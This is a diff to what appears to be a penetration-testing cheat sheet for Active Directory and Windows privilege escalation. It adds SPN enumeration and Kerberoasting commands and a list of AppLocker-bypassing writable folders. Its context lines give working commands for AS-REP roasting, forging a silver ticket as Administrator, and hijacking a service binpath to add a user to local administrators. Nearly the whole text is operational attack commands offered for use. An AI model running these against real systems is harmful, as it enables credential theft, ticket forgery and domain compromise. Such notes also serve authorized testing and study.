@@ -238,6 +238,8 @@ impacket-lookupsid <domain>/guest@$IP 10000   # same idea, via SID walking
 kerbrute userenum -d <domain> --dc $IP users.txt
 impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
+setspn.exe -Q */*                              # native SPN list, from the box, no creds to type
+#   then: Invoke-Kerberoast -OutputFormat hashcat | fl   or   Rubeus.exe kerberoast /format:hashcat
 # svc account hash -> Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
 impacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain <dom> -spn MSSQLSvc/sql.<dom>:1433 -user-id 500 Administrator
 export KRB5CCNAME=Administrator.ccache      # then any impacket tool with -k -no-pass
@@ -344,6 +346,8 @@ whoami /priv                                  # look for SeImpersonate -> potato
 systeminfo                                    # then windows-exploit-suggester
 # PoC is C source and the target has no compiler? cross-compile on Kali:
 x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
+# AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
+#   C:\Windows\System32\spool\drivers\color | C:\Windows\Tasks | C:\Windows\Temp   (Get-AppLockerPolicy -Effective -Xml)
 accesschk.exe -uwcqv <user> *                 # services you may reconfigure
 sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
